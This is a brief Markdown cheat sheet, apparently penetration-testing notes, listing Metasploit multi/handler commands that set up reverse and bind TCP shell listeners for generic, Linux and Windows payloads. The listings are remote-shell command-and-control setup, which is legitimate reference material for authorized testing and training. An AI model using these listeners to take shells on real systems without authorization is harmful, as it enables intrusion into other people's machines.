# Metasploit

Search Tag(s): #metasploit-framework #command-and-control

## 01 - Multi Handler

## 1.1 - Setting up a Generic TCP listener

### 1.1.1 - Reverse Callback

```
msf > use exploit/multi/handler

msf exploit(multi/handler) > set payload generic/shell_reverse_tcp

msf exploit(multi/handler) > set lhost <IP>

msf exploit(multi/handler) > set lport <PORT>

msf exploit(multi/handler) > run -j
```

### 1.1.2 - Bind Callback

```
msf > use exploit/multi/handler

msf exploit(multi/handler) > set payload generic/shell_bind_tcp

msf exploit(multi/handler) > set rhost <target_IP>

msf exploit(multi/handler) > set lport <PORT>

msf exploit(multi/handler) > run -j
```

## 1.2 - Setting up a Linux TCP listener

### 1.2.1 - Reverse Callback

```
msf > use exploit/multi/handler

msf exploit(multi/handler) > set payload linux/<x86 | x64>/shell_reverse_tcp

msf exploit(multi/handler) > set lhost <IP>

msf exploit(multi/handler) > set lport <PORT>

msf exploit(multi/handler) > run -j
```

### 1.2.2 - Bind Callback

```
msf > use exploit/multi/handler

msf exploit(multi/handler) > set payload linux/<x86 | x64>/shell_bind_tcp

msf exploit(multi/handler) > set rhost <target_IP>

msf exploit(multi/handler) > set lport <PORT>

msf exploit(multi/handler) > run -j
```

## 1.3 - Setting up a Windows TCP listener

### 1.3.1 - Reverse Callback

```
msf > use exploit/multi/handler

msf exploit(multi/handler) > set payload windows/[x64/]shell_reverse_tcp

msf exploit(multi/handler) > set lhost <IP>

msf exploit(multi/handler) > set lport <PORT>

msf exploit(multi/handler) > run -j
```

### 1.3.2 - Bind Callback

```
msf > use exploit/multi/handler

msf exploit(multi/handler) > set payload windows/[x64/]shell_bind_tcp

msf exploit(multi/handler) > set rhost <target_IP>

msf exploit(multi/handler) > set lport <PORT>

msf exploit(multi/handler) > run -j
```